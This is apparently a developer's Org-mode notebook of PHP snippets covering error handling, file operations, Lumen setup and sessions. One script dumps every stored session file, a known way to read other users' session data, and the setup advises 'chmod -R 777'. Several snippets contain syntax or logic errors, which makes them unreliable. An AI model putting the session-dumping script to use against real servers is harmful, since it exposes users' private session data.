http://stackoverflow.com/questions/139474/how-can-i-capture-the-result-of-var-dump-to-a-string

** [BH] error logger
#+begin_src php 
<?php
error_reporting(0);
//error_reporting(E_ALL);//should be E_NONE
//error_reporting(E_ERROR | E_PARSE);
ini_set("display_errors",1);
ini_set("track_errors",1);
$old_error_handler = set_error_handler("errorHandler");

function errorHandler ($errno, $errstr, $errfile, $errline) {
    if($errno!=2048) //deprecated warnings
        toLog("errno: {$errno} str: {$errstr} on file: {$errfile} line :{$errline}");
}

function toLog($msg)
{
    if(!array_key_exists("log_handler",$GLOBALS))
    {
        $fh=fopen("/var/log/XBS/xbs_interface.log","a+");
        if(!$fh)
            return;
        $GLOBALS["log_handler"]=$fh;
    }
    else
    {
        $fh=$GLOBALS["log_handler"];
    }
    $timeArr=localtime(time(),1);
    $timeStr="{$timeArr["tm_year"]}/{$timeArr["tm_mon"]}/{$timeArr["tm_mday"]} {$timeArr["tm_hour"]}:{$timeArr["tm_min"]}";
    $phperr=isset($php_errormsg)?$php_errormsg:"";
    fwrite($fh,"{$timeStr} {$msg} {$phperr}\n");
    return;

}

?>
#+end_src

** Making Assertions
To disable assert( ) calls, use this line of code: 
#+begin_src php
assert_options(ASSERT_ACTIVE, 0);
#+end_src 

And to make PHP end script execution rather than just issue a warning, we can use this line of code: 

#+begin_src php 
assert_options(ASSERT_BAIL, 1);
#+end_src 

ASSERT_CALLBACK is a useful option, as it allows you to write an error handler
for when your code fails an assertion.

#+begin_src php
function assert_failed($file, $line, $expr) {
        print "Assertion failed in $file on line $line: $expr\n";
}
assert_options(ASSERT_CALLBACK, 'assert_failed');
assert_options(ASSERT_WARNING, 0);
$foo = 10;
$bar = 11;
assert($foo > $bar);
#+end_src

ASSERT_WARNING is also disabled, which stops PHP from outputting a warning as well as running the callback function. 

** enabling assertions for php 7
change =assert.active= in  =/etc/php/apache2/php.ini= to On.
Assertions are OFF out of the box on 7.0.
#+begin_src 
assert.active = On
#+end_src 

** CATCH ALL EXCEPTIONS AND ERRORS IN A NORMALIZED AND CONSISTENT MATTER
#+begin_src php
error_reporting(ENV === 'dev' ? E_ALL : 0);

set_error_handler("error_handler");
set_exception_handler("error_handler");
register_shutdown_function("error_handler");

function error_handler()
{
    // Check for unhandled errors (fatal shutdown)
    $e = error_get_last();

    // If none, check function args (error handler)
    if($e === null)
        $e = func_get_args();

    // Return if no error
    if(empty($e))
        return;

    // "Normalize" exceptions (exception handler)
    if($e[0] instanceof Exception)
    {
        call_user_func_array(__FUNCTION__, array(
            $e[0]->getCode(),
            $e[0]->getMessage(),
            $e[0]->getFile(),
            $e[0]->getLine(),
            $e[0]));
        return;
    }

    $e = array_combine(array('number', 'message', 'file', 'line', 'context'), array_pad($e, 5, null));
    
    var_dump($e);
    exit;
}
#+end_src
This way the only irregularity should be the last property, context. In cases of
errors this will be an array with variables in the context where the error
occurred, while for exceptions I’m setting it to the Exception itself. Normally
you’d then pass $e to something that would format the information nicely to the
user, do some logging or whatever.

* exceptions
** Throwing Exceptions

#+begin_src php
// something has gone wrong
throw new Exception('Meaningful error message string');
#+end_src 

** Extending Exceptions

#+begin_src php
class HeavyParcelException extends Exception {}
#+end_src 

We can set any properties or add any methods we desire to this Exception class.

** Setting a Global Exception Handler

To avoid seeing fatal errors where exceptions have been thrown and our code failed
to catch them, we can set a default behavior for our application in this situation.
To do this, we use a function called =set_exception_handler()= . This accepts a
callback as its parameter, so we can give the name of a function to use, for example.
An exception handler will usually present an error screen to the user—much nicer
than a fatal error message!

#+begin_src php
//A basic exception handler would look similar to this:
function handleMissedException($e) {
  echo "Sorry, something is wrong. Please try again, or contact us if the problem persists";
  error_log('Unhandled Exception: ' . $e->getMessage() . ' in file ' . $e->getFile() . ' on line ' . $e->getLine());
}
set_exception_handler('handleMissedException');
throw new Exception('just testing!');
#+end_src 

* patterns
** value object pattern

*The Problem*
So, how do you implement a lightweight, or easy to construct, descriptive object like Date or Dollar?

*The Solution*
Lightweight objects should behave like PHP integers: if you assign the same object to two different
variables and then change one of the variables, the other variable should remain unaffected.

#+begin_src php
class Dollar {
   protected $amount;
   public function __construct($amount=0) {
     $this->amount = (float)$amount;
   }
   public function getAmount() {
      return $this->amount;
   }
   public function add($dollar) {
      return new Dollar($this->amount + $dollar->getAmount());
   }
}
#+end_src

The fundamentals of the ValueObject pattern in PHP 5 are:
1. Protect the attributes of a Value Object so direct access is forbidden.
2. Set the object’s attributes in the constructor.
3. Provide no “setter” functions, which otherwise allow attributes to be altered.
** The factory pattern
*The Problem*
How can you create such “complex” objects easily and conveniently—without cut-and-paste pro-
gramming?

*The Solution*
Create a “factory”—a function or a class method— to “manufacture” new objects.
** creational 
*** Factory method
*** prototype

* files
** Reading Entire files

To read the contents of a file into a string, use =file_get_contents()=. Pass it a file‐
name, and it returns a string containing everything in the file.

** Writing Entire file
use =file_put_contents()=.

#+begin_src php
// Write the results to page.html
file_put_contents('page.html', $page);
#+end_src 

** Reading and writing parts of files

use =file()= function to access each line of file.
=file()= reads the whole file into an array and it is not good for large files.

#+begin_src php
foreach (file('people.txt') as $line) {
  $line = trim($line);
  $info = explode('|', $line);
  print '<li><a href="mailto:' . $info[0] . '">' . $info[1] ."</li>\n";
}
#+end_src 

** reading a file one line at a time

#+begin_src php
$fh = fopen('people.txt','rb');
while ((! feof($fh)) && ($line = fgets($fh))) {
  $line = trim($line);  // fgets() includes the trailing newline at the end of line.
  $info = explode('|', $line);
  print '<li><a href="mailto:' . $info[0] . '">' . $info[1] ."</li>\n";
}
fclose($fh);
#+end_src 

** Inserting CSV data into a database table
  
#+begin_src php
try {
  $db = new PDO('sqlite:/tmp/restaurant.db');
} catch (Exception $e) {
  print "Couldn't connect to database: " . $e->getMessage();
  exit();
}
$fh = fopen('dishes.csv','rb');
$stmt = $db->prepare('INSERT INTO dishes (dish_name, price, is_spicy) VALUES (?,?,?)');

while ((! feof($fh)) && ($info = fgetcsv($fh))) {
  // $info[0] is the dish name (the first field in a line of dishes.csv)
  // $info[1] is the price (the second field)
  // $info[2] is the spicy status (the third field)
  // Insert a row into the database table
  $stmt->execute($info);
  print "Inserted $info[0]\n";
}
// Close the file
fclose($fh);
#+end_src 

** Writing CSV-formatted data to a file

#+begin_src php
try {
  $db = new PDO('sqlite:/tmp/restaurant.db');
} catch (Exception $e) {
  print "Couldn't connect to database: " . $e->getMessage();
  exit();
}
// Open the CSV file for writing
$fh = fopen('dish-list.csv','wb');
$dishes = $db->query('SELECT dish_name, price, is_spicy FROM dishes');
while ($row = $dishes->fetch(PDO::FETCH_NUM)) {
    // Write the data in $row as a CSV-formatted string. fputcsv()
    // adds a newline at the end.
  fputcsv($fh, $row);
}
fclose($fh);
#+end_src 

** changing the page type of CSV
   
#+begin_src php
// Tell the web client to expect a CSV file
header('Content-Type: text/csv');
// Tell the web client to view the CSV file in a separate program
header('Content-Disposition: attachment; filename="dishes.csv"');
#+end_src

** delete all files in a directory
#+begin_src php
<?PHP
 
FUNCTION emptyDir($path) { 
 
     // init the debug string
     $debugStr = '';
     $debugStr .= "Deleting Contents Of: $path<br /><br />";
 
     // parse the folder
     IF ($handle = OPENDIR($path)) {
 
          WHILE (FALSE !== ($file = READDIR($handle))) {
 
               IF ($file != "." && $file != "..") {
 
               // If it's a file, delete it
               IF(IS_FILE($path."/".$file)) {
 
                    IF(UNLINK($path."/".$file)) {
                    $debugStr .= "Deleted File: ".$file."<br />";     
                    }
 
               } ELSE {
 
                    // It's a directory...
                    // crawl through the directory and delete the contents               
                    IF($handle2 = OPENDIR($path."/".$file)) {
 
                         WHILE (FALSE !== ($file2 = READDIR($handle2))) {
 
                              IF ($file2 != "." && $file2 != "..") {
                                   IF(UNLINK($path."/".$file."/".$file2)) {
                                   $debugStr .= "Deleted File: $file/$file2<br />";     
                                   }
                              }
 
                         }
 
                    }
 
                    IF(RMDIR($path."/".$file)) {
                    $debugStr .= "Directory: ".$file."<br />";     
                    }
 
               }
 
               }
 
          }
 
     }
     RETURN $debugStr;
}
 
 
#+end_src

** List files in directory
#+begin_src php
<?PHP 
 
IF ($handle = OPENDIR('/system/path/to/files')) { 
    ECHO "Files:\n"; 
 
    // list out the files 
    WHILE (FALSE !== ($file = READDIR($handle))) { 
        ECHO "$file\n"; 
    } 
 
    CLOSEDIR($handle); 
} 
 
?> 
#+end_src

** Test If File Is Included

#+begin_src php
<?PHP
 
IF(__FILE__ == $_SERVER['SCRIPT_FILENAME'])
    DIE("This file cannot be executed directly");
 
?>
#+end_src

** Get all files into an Array

#+begin_src php
<?PHP
 
$files = GLOB('/path/to/some/directory/*.*');
 
PRINT_R($files);  
 
?>
#+end_src

** Directory Listing

#+begin_src php
<?PHP
 
//define the path as relative
$path = "/home/yoursite/public_html/whatever";
 
//using the opendir function
$dir_handle = @OPENDIR($path) or DIE("Unable to open $path");
 
ECHO "Directory Listing of $path<br/>";
 
//running the while loop
WHILE ($file = READDIR($dir_handle)) {
        ECHO "<a href=$file>$file</a><br/>";
}
 
//closing the directory
CLOSEDIR($dir_handle);
 
?> 
#+end_src

** Directory Listing #2

#+begin_src php
<?PHP
 
// No slash at the end
$main_dir = 'path/to/dir'; 
 
$dirs = GLOB("{$main_dir}/*", GLOB_ONLYDIR);
$dirs = ARRAY_MAP('basename', $dirs);
$dirs = ARRAY_FILTER($dirs, 'no_underscore');
 
FUNCTION no_underscore($dirname){
    RETURN $dirname[0] != '_';
}
 
ECHO '<pre>', PRINT_R($dirs, TRUE), '</pre>'; 
 
?>
#+end_src

** Copy File From Server

#+begin_src php
<?PHP
 
$inputfile = FOPEN("http://the-remote-server.com/inputfile.txt", "r");
$outputfile = FOPEN("outputfile.txt", "w");
ECHO "File opened...";
$data = '';
 
WHILE (!FEOF($inputfile)) {
  $data .= FREAD($inputfile, 8192);
}
 
ECHO "Data read...";
FWRITE($outputfile, $data);
ECHO "transfered data";
FCLOSE ($inputfile);
FCLOSE ($outputfile);
 
ECHO "Done.";
 
?>
 
#+end_src

** Count lines in file

#+begin_src php
<?PHP  
 
$file = "somefile.txt";  
$lines = COUNT(FILE($file));  
ECHO "There are $lines lines in $file";
 
?> 
#+end_src

** Delete by date
   
#+begin_src php
<?PHP
 
// set delete time threshold for two weeks
$DAYS = 14;
 
IF (IS_DIR("$path") ){
   $handle=OPENDIR($path);
   WHILE (FALSE!==($file = READDIR($handle))) {
       IF ($file != "." && $file != "..") { 
           $Diff = (TIME() - FILECTIME("$path/$file"))/60/60/24;
           IF ($Diff > $DAYS) UNLINK("$path/$file");
       }
   }
   CLOSEDIR($handle);
}
 
?>
#+end_src

** Delete by wildcard

#+begin_src php
 <?PHP
 
FOREACH (GLOB("*.jpg") AS $filename) {
   ECHO "$filename size " . FILESIZE($filename) . "\n";
   UNLINK($filename);
}
 
?>
#+end_src

** Download File To Client

#+begin_src php
<?PHP
 
FUNCTION send_file($name) {
  OB_END_CLEAN();
  $path = "protected/".$name;
  IF (!IS_FILE($path) or CONNECTION_STATUS()!=0) RETURN(FALSE);
  HEADER("Cache-Control: no-store, no-cache, must-revalidate");
  HEADER("Cache-Control: post-check=0, pre-check=0", FALSE);
  HEADER("Pragma: no-cache");
  HEADER("Expires: ".GMDATE("D, d M Y H:i:s", MKTIME(DATE("H")+2, DATE("i"), DATE("s"), DATE("m"), DATE("d"), DATE("Y")))." GMT");
  HEADER("Last-Modified: ".GMDATE("D, d M Y H:i:s")." GMT");
  HEADER("Content-Type: application/octet-stream");
  HEADER("Content-Length: ".(string)(FILESIZE($path)));
  HEADER("Content-Disposition: inline; filename=$name");
  HEADER("Content-Transfer-Encoding: binary\n");
  IF ($file = FOPEN($path, 'rb')) {
   WHILE(!FEOF($file) and (CONNECTION_STATUS()==0)) {
     PRINT(FREAD($file, 1024*8));
     FLUSH();
   }
   FCLOSE($file);
  }
  RETURN((CONNECTION_STATUS()==0) and !CONNECTION_ABORTED());
}
 
?>
 
 
And here's an example of using the function:
 
<?PHP
 
IF (!send_file("platinumdemo.zip")) {
DIE ("file transfer failed");
 
// either the file transfer was incomplete
// or the file was not found
 
} ELSE {
 
// the download was a success
// log, or do whatever else
}
 
?> 
#+end_src

** Get filesize without downloading

#+begin_src php
<?PHP
 
$file = 'http://www.example.com/file.zip';
 
$fp   = FOPEN( $file, 'r' );
$data = STREAM_GET_META_DATA( $fp )
FCLOSE( $fp );
 
PRINT_R( $data );
 
/*
$data will contain something similar to the following:
 
Array
(
    [0] => HTTP/1.1 200 OK
    [1] => Date: Sat, 23 Jun 2007 00:48:50 GMT
    [2] => Server: Apache/2.2.0 (Fedora)
    [3] => Last-Modified: Sat, 23 Dec 2006 20:05:47 GMT
    [4] => ETag: "9f2523-25b0-1716fcc0"
    [5] => Accept-Ranges: bytes
    [6] => Content-Length: 9648
    [7] => Connection: close
    [8] => Content-Type: image/jpeg
)
 
You'll want the Content-Length header for file size, or $data[6].
 
*/
 
?>
#+end_src
 
** Test if a give filesystem path is absolute.
#+begin_src php 
function path_is_absolute( $path ) {
	/*
	 * This is definitive if true but fails if $path does not exist or contains
	 * a symbolic link.
	 */
	if ( realpath($path) == $path )
		return true;

	if ( strlen($path) == 0 || $path[0] == '.' )
		return false;

	// Windows allows absolute paths like this.
	if ( preg_match('#^[a-zA-Z]:\\\\#', $path) )
		return true;

	// A path starting with / or \ is absolute; anything else is relative.
	return ( $path[0] == '/' || $path[0] == '\\' );
}
#+end_src 

** Join two filesystem paths together.
#+begin_src php 
function path_join( $base, $path ) {
	if ( path_is_absolute($path) )
		return $path;

	return rtrim($base, '/') . '/' . ltrim($path, '/');
}
#+end_src

** simple directory recursion
#+begin_src php 
// This should return false if there is something you want excluded
function filter($file, $key, $iterator)
{
    $exclude = array('.git');
    return ! in_array($file->getFilename(), $exclude);
}

// Recursive directory iterator for current directory, ignoring dots
$it = new RecursiveDirectoryIterator('.', FilesystemIterator::SKIP_DOTS);
// Wrapped by a filtering iterator with our filter function
$it = new RecursiveCallbackFilterIterator($it, 'filter');
// Wrapped by an iterator which automatically traverses children for us
$it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::SELF_FIRST);

// And then just loop :)
foreach($it as $file)
{
    echo str_repeat("\t", $it->getDepth())
        . $file->getRealPath()
        . PHP_EOL;
}
#+end_src 
** delete directory recursively
#+begin_src php
function delete_directory($dir)
{
    if( ! file_exists($dir))
        return;

    $it = new RecursiveDirectoryIterator($dir);
    $it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);

    foreach($it as $file)
        if($file->isDir())
            @rmdir($file->getRealPath());
        else
            @unlink($file->getRealPath());
}
#+end_src 

** STREAM A FILE LINE-BY-LINE USING A GENERATOR 
#+begin_src php
function read($file)
{
    $fp = fopen($file, 'rb');

    while(($line = fgets($fp)) !== false)
        yield rtrim($line, "\r\n");

    fclose($fp);
}

// Usage
foreach(read('http://example.com') as $line)
{
    var_dump($line);
}
#+end_src

** Remove extension from a filename with PHP
*** Using pathinfo
The pathinfo() function returns an array containing the directory name,
basename, extension and filename. Alternatively, you can pass it one of the
PATHINFO_ constants and just return that part of the full filename:
#+begin_src php 
$filename = 'filename.html';
$without_extension = pathinfo($filename, PATHINFO_FILENAME);
#+end_src 

If the filename contains a full path, then only the filename without the
extension is returned.

*** Using basename
If the extension is known and is the same for the all the filenames, you can
pass the second optional parameter to basename() to tell it to strip that
extension from the filename:
#+begin_src php 
$filename = 'filename.html';
$without_extension = basename($filename, '.html');
#+end_src 

If the filename contains a full path, then only the filename without the
extension is returned.

*** Using substr and strrpos
#+begin_src php 
$filename = 'filename.html';
$without_extension = substr($filename, 0, strrpos($filename, "."));
#+end_src 

If the filename contains a full path, then the full path and filename without
the extension is returned. You could basename() it as well to get rid of the
path if needed (e.g. basename(substr($filename, 0, strrpos($filename, "."))))
although it's slower than using pathinfo.

*** Benchmarking
Running each of these in a loop 10,000,000 times on my Mac with PHP 5.4:

pathinfo: 10.13 seconds
basename: 7.87 seconds
substr/strrpos: 6.05 seconds
basename(substr/strrpos): 11.98 seconds

If the filename doesn't contain the full path or it doesn't matter if it does,
then the substr/strrpos option appears to be the fastest.

If the filename does contain a path and you don't want the path but do know what
the extension you want to remove is, then basename appears to be the fastest.

If the filename contains a path, you don't want the path and you don't know what
the extension is, then use the pathinfo() option.

** Get the directory name, filename and extension with pathinfo()
PHP's pathinfo() function returns an associative array containing the basename,
dirname, extension and (from PHP 5.2.0) the filename without the extension.

#+begin_src php
print_r(pathinfo($path));
will echo

Array
(
    [dirname] => /var/www/mywebsite/htdocs/images
    [basename] => myphoto.jpg
    [extension] => jpg
    [filename] => myphoto
)
#+end_src 

To get just the extension you could do something like this, assuming you would
rather save the extension to a separate variable rather than use the returned
associative array:

#+begin_src php 
$pathinfo = pathinfo($path);
$extension = $pathinfo['extension'];
#+end_src 

** Get the directory name with dirname()
#+begin_src php 
echo dirname($path)
#+end_src

** recursive rm
#+begin_src php
function recursive_rm( $path )
{
    /* open dir handel - return on fail */
    if( !$dir = @opendir( $path ))
    return ( FALSE );

    /* for each file in dir */
    while( ($file = readdir($dir)) !== FALSE )
    {
         /* if not special */
         if($file == '.' || $file == '..')
         continue;

          /* if cant delete path send path back round */
          if(!@unlink($path . "/" . $file))
          $this->recursive_rm( $path . "/" . $file );
    }

    /* close handel */
    closedir( $dir );

    /* rm base dir */
    @rmdir( $path );

return ( TRUE );
}
#+end_src

* lumen
** lumen on apache
install a lumen app in */var/www*

#+begin_src shell
$ lumen new cms.app
#+end_src
 
make your storage folder writable

#+begin_src shell
$ sudo chmod -R 777 storage
#+end_src
 
create a virtual host file

#+begin_src shell
$ cp /ect/apache2/sites-available/000-default.conf /etc/apache2/sites-available/cms.conf
#+end_src
 
here we use a different port for listening incoming requests for this *VirtualHost*:

#+begin_src
<VirtualHost *:8081>
#...
DocunemtRoot /var/www/cms.app/public
<Directory /var/www/cms.app/public>
   AllowOverride all
   # other options
</Directory>
#...
</VirtualHost>
#+end_src

change *ports.conf* to listen to port 8081 by adding *Listen 8081* 
to */etc/apache2/ports.conf* file.

now we have to make the *VirtualHost* active by running *a2ensite*.

#+begin_src shell
$ sudo a2ensite cms.conf
#+end_src
 
restart the service for the new settings to take effect.

#+begin_src shell
$ sudo service apache2 restart   
#+end_src
 
https://httpd.apache.org/docs/2.4/vhosts/examples.html
https://gist.github.com/dbaeck/89d0b52d9d3d2777a96f
https://www.digitalocean.com/community/tutorials/how-to-set-up-apache-virtual-hosts-on-ubuntu-14-04-lts
https://www.digitalocean.com/community/questions/what-is-the-correct-folder-to-put-my-website-files-var-www-or-var-www-html
http://tecadmin.net/install-laravel-framework-on-ubuntu/
** installing globally
install the lumen-intaller

#+begin_src shell
$ composer global require "laravel/lumen-installer"
#+end_src

add the lumen binary to path. It can be found at:

 - *~/.composer/vendor/bin*
 - *~/.config/composer/vendor/bin*

call like this ~$ lumen new blog~ .

** PHP dependencies

#+begin_src shell
$ sudo apt-get install php7.0-zip 
#+end_src

** artisan
*** create a migration

#+begin_src 
$ php artisan make:migration create_books_table --create=books
#+end_src 

*** commit migration to db
    
#+begin_src shell
$ php artisan migrate
#+end_src 

*** Refreshing the Schema and Seeding the Database

#+begin_src shell 
$ composer dump-autoload
$ php artisan migrate:refresh
$ php artisan db:seed
#+end_src 

** middleware
Middleware provides a way to filter
incoming HTTP requests before a defined route handles the request. You can use middleware to do any
number of things, like authentication, validating a signed request, and CORS support, to name a few.
Middleware classes are typically created in the app/Http/Middleware path by convention

* elqoquent
** eloquent postgres json type
In your migrations you can do something like:

#+begin_src php
$table->json('field_name');
#+end_src
 
And in you model cast it to JSON by adding the $casts property like so:

#+begin_src php
class SomeModel extends Model
{
    protected $casts = [
        'field_name' => 'json'
    ];
}
#+end_src

* installation
** php packages

#+begin_src shell
$ sudo apt-get install libapache2-mod-php    # for running php in apache2
#+end_src

** phpstorm xdebug

#+begin_src shell
$ sudo apt-get install php-xdebug
#+end_src

to enable for php storm add =xdebug.remote_enable=1= to ~php.ini~.

https://confluence.jetbrains.com/display/PhpStorm/Zero-configuration+Web+Application+Debugging+with+Xdebug+and+PhpStorm
https://www.jetbrains.com/phpstorm/marklets/

* session handling
** starting a session
You may start a session manually with session_start, or you can
configure PHP to automatically start sessions with the
session.auto_start directive in php.ini.

#+begin_src php
session_start() !== false or die('could not start session');
#+end_src

** session variables example
   
#+begin_src php
<?php
    //start session
    session_start();

    //initialize a set of session variables
    if(!isset($_SESSION['a']))
    {
        print("Initializing Session<br>");

        $_SESSION['a'] = 'Session Var A';
        $_SESSION['b'] = 123.45;
        $_SESSION['c'] = 0;
    }

    //update session with access count
    $_SESSION['c']++;

    print("Access count: " . $_SESSION['c'] . "<br>");

    print("Session Dump: " . session_encode() . "<br>");
?>
#+end_src

** custom session handler

#+begin_src php
<?php
    class mySession
    {
        //prefix with which to mark session files
        var $mark;

        //path for storing session files
        var $path;

        //name of session cookie
        var $name;

        function mySession($mark='mySession_')
        {
            $this->mark = $mark;
        }

        function getFilePath($id)
        {
            return($this->path . '/' . $this->mark . $id);
        }

        function open($path, $name)
        {
            $this->path = $path;
            $this->name = $name;

            return(TRUE);
        }

        function close()
        {
            return(TRUE);
        }

        function read($id)
        {
            if($fp = @fopen(getFilePath($id), "r"))
            {
                return(fread($fp,
                       filesize($this->getFilePath($id))));
            }
            else
            {
                return("");
            }
        }

        function write($id, $data)
        {
            if($fp = @fopen($this->getFilePath($id), "w"))
            {
                return(fwrite($fp, $data));
            }
            else
            {
                return(FALSE);
            }
        }

        function destroy($id)
        {
            return(@unlink($this->getFilePath($id)));
        }

        function garbage($lifetime)
        {
            $d = dir($this->path);

            while($f = $d->read())
            {
                //file begins with mark and it's too old
                if((strpos($f, $this->mark) == 0) AND
                    (time() > (fileatime($f) + $lifetime)))
                {
                    unlink("$this->path/$f");
                }

            }
            $d->close();
            return(TRUE);
        }
    }

    $s = new mySession();

    session_set_save_handler(
        array($s, 'open'),
        array($s, 'close'),
        array($s, 'read'),
        array($s, 'write'),
        array($s, 'destroy'),
        array($s, 'garbage')
        );

    //start session
    session_start();

    //initialize a set of session variables
    if(!isset($_SESSION['a']))
    {
        print("Initializing Session<br>");

        $_SESSION['a'] = 'Session Var A';
        $_SESSION['b'] = 123.45;
        $_SESSION['c'] = 0;
    }

    //update session with access count
    $_SESSION['c']++;

    print("Access count: " . $_SESSION['c'] . "<br>");

    print("Session Dump: " . session_encode() . "<br>");
?>
#+end_src

** ending a session
*** intro   
use =session_destroy()= function.  

Keep in mind that ending a session
doesn't make the values from that session unavailable to the rest of
the currently executing PHP page.

#+begin_src php
<?php
session_start();
// Do some miscellaneous work
$_SESSION['username'] = 'Michele';
// Logout of the site
session_destroy();
echo "At this point we can still see the value of username as
".$_SESSION['username']."<br />";
$_SESSION = array();
echo "Now the value of username is blank: ".$_SESSION['username'];
?>
#+end_src

*** example #1
#+begin_src php
function closeSession()
{
//this empties the $_SESSION[] array
$_SESSION = array();
//find the name of current session (if there is one), and then remove it
//from user's computer
if (session_id() != "" || isset($_COOKIE[session_name()] ))
  setcookie(session_name(), '', time() - 3600, '/');
session_destroy();
}
#+end_src 

** Exposed Session Data 
   
 #+begin_src php
 #!/usr/bin/env php
 <?php

     header('Content-Type: text/plain');
     session_start();

     $path = ini_get('session.save_path');
     $handle = dir($path);

     while ($filename = $handle->read())
     {
       if (substr($filename, 0, 5) == 'sess_')
       {
         $data = file_get_contents("$path/$filename");

         if (!empty($data))
         {
           session_decode($data);
           $session = $_SESSION;
           $_SESSION = array();
           echo "Session [" . substr($filename, 5) . "]\n";
           print_r($session);
           echo "\n--\n\n";
         }
       }
     }

 ?>  
 #+end_src

** making sure session data is not lost after redirect

call =exit()= after redirect.
use =session_write_close()=

** check for session status
   
#+begin_src php
function is_session_started()
{
    if ( php_sapi_name() !== 'cli' ) {
        if ( version_compare(phpversion(), '5.4.0', '>=') ) {
            return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE;
        } else {
            return session_id() === '' ? FALSE : TRUE;
        }
    }
    return FALSE;
}

// Example
if ( is_session_started() === FALSE ) session_start();
?>
#+end_src

** delete a single item of ~$_SESSION~
To remove a specific variable from the session use:
#+begin_src php 
session_unregister('variableName');
# or
unset($_SESSION['variableName']);
#+end_src

** session security
*** using user's IP and USER_AGENT
#+begin_src php
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];
// now each time you load session variables, perform a quick security at the same time
session_start();
if($_SESSION['ip'] != $_SERVER['REMOTE_ADDR']  ||
    $_SESSION['ua']  != $_SERVER['HTTP_USER_AGENT'])
{
  closeSession();
}
#+end_src

** Changing allowable session idle time 
#+begin_src php 
<?php
ini_set('session.gc_maxlifetime',600'); // 600 seconds =  = ten minutes
session_start( );

// If you wish to know what the current timeout period is, you can display it using the following:
echo ini_get('session.gc_maxlifetime');
?>
#+end_src 

** Changing the expired session cleanup probability 
xpired sessions don't actually get wiped out instantly after 24 minutes elapses.
Here's how it really works: at the beginning of any request that uses sessions
(because the page calls session_start( ) or session.auto_start is on), there is
a 1% chance that the PHP interpreter scans through all of the sessions on the
server and deletes any that are expired. "A 1% chance" sounds awfully
unpredictable for a computer program. It is. But that randomness makes things
more efficient. On a busy site, searching for expired sessions to destroy at the
beginning of every request would consume too much server power.

#+begin_src php
<?php
ini_set('session.gc_probability',100); // 100% : clean up on every request
session_start( );
?>
#+end_src

** change session save path
*** example #1
#+begin_src php
session_save_path( dirname(__FILE__) . '/tmp/sessions');
ini_set('session.gc_probability', 1);
#+end_src 

* SPL
** Available objects in SPL
   
#+begin_src php
<?php
foreach(spl_classes() as  $k=>$v){
    echo nl2br($v."\n");
}
?>
#+end_src
** iterators
*** LimitIterator
The LimitIterator is one of the easiest SPL iterators to use. It determines where to start
the loop and how many times it should run. The LimitIterator constructor takes three
arguments: the array or object you want to loop through, the starting point (counting
from zero), and the number of times the loop is to run.

#+begin_src php
$numbers = array(5, 10, 8, 35, 50);
// Prepare the array for use with an iterator
$iterator = new ArrayIterator($numbers);
// Pass the converted array to the LimitIterator
$limiter = new LimitIterator($iterator, 0, 2);
// Loop through the LimitIterator object
foreach ($limiter as $number) {
    echo $number . '<br />';
}
/*output
5
10
*/
#+end_src

* using =include_path= to manage large projects

You can add include_path configuration option in the php.ini file. You
can use include_path to define a list of directories that will be
searched when include() type functions specify relative
paths. Directories should be separated by colons (semicolons on
Windows platforms), as shown here:

#+begin_src
include_path=".:/home/mary/php_lib:/usr/local/lib/php"
#+end_src
 
if you don't have access to php.ini file you can set the include_path option in .htaccess file:

#+begin_src
php_value include_path /home/mary/php_lib
#+end_src

you could also use the ini_set() function to set the option at runtime:
#+begin_src php
ini_set("include_path", "/home/mary/php_lib");
#+end_src
 
As of PHP 4.3, she can use the set_include_path() function to achieve the same effect, like so:

#+begin_src php
set_include_path( "/home/mary/php_lib" );
#+end_src
 
* output buffering
** intro
   
The idea of output buffering is to store all the content that has to
be outputted in a memory buffer before outputting the whole
buffer. This has the following advantages: 
 - I/O operations are reducedto one which is a great performance improvement
 - Content can be manipulated and parsed before outputting it to the browser
 - The I/O operation can be done sequentially and quickly

The downside to this is that the client has to wait until the script
completes. Therefore, depending on the application design and the
script execution time, the user might come to the conclusion that the
system crashed and they will close the browser or do something else
that would not be quite what we want.

** detect if output buffering is turned on?
   
#+begin_src php
if(ob_get_level() > 0){
   //there are some buffers active.
}

$ php -d output_buffering=1 -r'var_dump(ob_get_level());'
int(1)
$ php -d output_buffering=0 -r'var_dump(ob_get_level());'
int(0)
#+end_src
 
It does however check whether there is an output buffer active, not
what the actual setting of PHP itself is. A manual ob_start() (or more
then one) will also increase the level.

** example
   
#+begin_src php
<?php
ob_start();

echo("This is a test\n");
echo("More content\n");

ob_end_flush();
?>
#+end_src

* request
** check if request is ajax?
   
#+begin_src php
function is_ajax() {
  return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
}
#+end_src

* page generation time
** solution1

#+begin_src php
<?php
$time = microtime();
$time = explode(' ', $time);
$time = $time[1] + $time[0];
$start = $time;
?>

<?php
$time = microtime();
$time = explode(' ', $time);
$time = $time[1] + $time[0];
$finish = $time;
$total_time = round(($finish - $start), 4);
echo 'Page generated in '.$total_time.' seconds.';
?>
#+end_src

** solution2
   
#+begin_src php

function microtime_float()
{
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

$time_start = microtime_float();

// Sleep for a while
usleep(100);

$time_end = microtime_float();
$time = $time_end - $time_start;

echo "Did nothing in $time seconds\n";
#+end_src

** solution3

=microtime()= and =REQUEST_TIME_FLOAT= (as of PHP 5.4.0)

#+begin_src php

// Randomize sleeping time
 usleep(mt_rand(100, 10000));
 
// As of PHP 5.4.0, REQUEST_TIME_FLOAT is available in the $_SERVER superglobal array.
// It contains the timestamp of the start of the request with microsecond precision.
$time = microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"];

echo "Did nothing in $time seconds\n";
#+end_src

* autoloading
** intro
   
Autoloading is when we tell PHP where to look for our class files when it needs
a class declaration that it’s yet to see.

* magic constants
** summary
#+begin_src php
// Get current class name. Must be used inside a class declaration.
echo "Current class name is " . __CLASS__;

// Get full path directory of a file
echo "Current directory is " . __DIR__;

    // Typical usage
    require __DIR__ . '/vendor/autoload.php';

// Get full path of a file
echo "Current file path is " . __FILE__;

// Get current function name
echo "Current function name is " . __FUNCTION__;

// Get current line number
echo "Current line number is " . __LINE__;

// Get the name of the current method. Only returns a value when used inside a trait or object declaration.
echo "Current method is " . __METHOD__;

// Get the name of the current namespace
echo "Current namespace is " . __NAMESPACE__;

